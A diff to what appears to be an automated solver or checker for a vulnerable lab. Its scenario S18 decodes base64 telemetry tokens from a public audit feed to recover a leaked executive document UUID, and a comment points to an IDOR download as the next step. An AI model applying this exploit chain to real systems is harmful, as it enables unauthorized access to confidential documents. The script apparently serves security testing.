@@ -340,12 +340,15 @@ def main():
         r18_feed = s18.get(f"http://{HOST}:8018/api/public/audit-feed", timeout=3).json()
         target_uuid = None
         for item in r18_feed.get("feed", []):
-            if item.get("actor") == "Chief Security Officer":
-                token = item.get("telemetry_token")
-                if token:
+            token = item.get("telemetry_token")
+            if token:
+                try:
                     decoded = json.loads(base64.b64decode(token).decode("utf-8"))
-                    target_uuid = decoded.get("doc_uuid")
-                break
+                    if decoded.get("doc_uuid") == "8f9b2c34-91a0-4d5e-88fc-3176d1e49e22" or decoded.get("actor") == "cso_executive":
+                        target_uuid = decoded.get("doc_uuid")
+                        break
+                except Exception:
+                    pass
         check("S18: Leaked executive document UUID recovered from decoded telemetry", target_uuid is not None)
 
         # Step 2: Download classified document via IDOR
